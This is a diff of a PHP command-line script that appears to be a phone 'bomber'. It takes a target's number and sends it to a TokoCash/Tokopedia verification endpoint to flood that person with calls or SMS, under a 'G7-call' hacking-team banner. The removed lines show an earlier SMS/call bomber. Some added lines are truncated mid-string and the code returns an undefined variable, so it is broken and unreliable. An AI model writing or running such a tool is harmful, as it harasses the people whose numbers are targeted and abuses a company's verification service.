@@ -1,25 +1,22 @@
 <?php
-include 'func.php';
-
-/*
-    https://github.com/nee48/BomTelpSmsTokped
-    Made by Handika Pratama
-*/
-
-$init = new Bom();
-
-//Eksekusi Call/Sms Boomber (Limit 3x/Jam)
-
-echo "Nomor? (ex : 628xxxx)\nInput : ";
-$a = trim(fgets(STDIN));
-$init->no = "$a";
-$init->type = 2; //Type 2 untuk telpon, Type 1 untuk sms
-//$init->no = "0895371761108"; //Nomer Hp tujuan
-
-if ($init->type == 1) {
-        for ($i=0; $i < 2; $i++) {
-            $init->Verif($init->no,$init->type);
-        }
-}elseif ($init->type == 2) {
-         $init->Verif($init->no,$init->type);
+// Limit 3x Telpon Setiap Satu Nomor
+function send($phone){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth                                                        >
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, true);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=ca                                                        >
+        curl_close($ch);
+                echo $asw."\n";
 }
+echo "[+]#########################[+]\n";                  
+echo "[!] G7-call                 [!]\n";
+echo "[!] TEAM ; ERROR CYBER ARMY [!]\n";
+echo "[+]#########################[+]\n\n";
+echo "[!]Nomor\nInput : ";
+$nomor = trim(fgets(STDIN));
+$execute = send($nomor);
+print $execute;
+?>
